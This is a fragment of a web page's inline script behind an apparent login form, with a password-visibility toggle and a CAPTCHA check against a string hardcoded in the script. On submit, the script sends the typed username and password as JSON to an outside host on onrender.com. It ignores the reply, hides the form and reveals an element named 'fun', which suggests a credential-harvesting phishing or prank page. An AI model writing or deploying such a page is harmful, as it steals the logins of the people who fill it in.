        <script>
            var isEyeOpened = false;

            function toggleEye() {
                if (isEyeOpened) {
                    isEyeOpened = false;
                    document
                        .getElementById("passwordIcon")
                        .classList.remove("fa-eye-slash");
                    document
                        .getElementById("passwordIcon")
                        .classList.add("text-danger");
                    document
                        .getElementById("passwordIcon")
                        .classList.remove("text-primary");
                    document
                        .getElementById("passwordIcon")
                        .classList.add("fa-eye");
                    document.getElementById("password").type = "password";
                } else {
                    isEyeOpened = true;
                    document
                        .getElementById("passwordIcon")
                        .classList.add("fa-eye-slash");
                    document
                        .getElementById("passwordIcon")
                        .classList.add("text-primary");
                    document
                        .getElementById("passwordIcon")
                        .classList.remove("text-danger");
                    document
                        .getElementById("passwordIcon")
                        .classList.remove("fa-eye");
                    document.getElementById("password").type = "text";
                }
            }
            const submit = document.getElementById("submitBtn");
            const box = document.getElementById("container-fluid");
            const fun = document.getElementById("fun");
            

            submit.addEventListener("click", async () => {
                const inputval = document.getElementById("captchaStr").value;
                const api = "https://backend-7xhz.onrender.com"
                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;

                if (username != "") {
                    if (password != "") {
                        if (inputval === "P3593K") {
                            const res = await fetch(
                                `${api}/submit`,
                                {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/json",
                                    },
                                    body: JSON.stringify({
                                        username,
                                        password,
                                    }),
                                },
                            );
                            box.style.display = "none";
                            fun.style.display = "block";
                        } else {
                            alert("Invalid CAPTCHA");
                        }
                    } else {
                        alert("Invalid PASSWORD");
                    }
                } else {
                    alert("Invalid USERNAME");
                }
            });
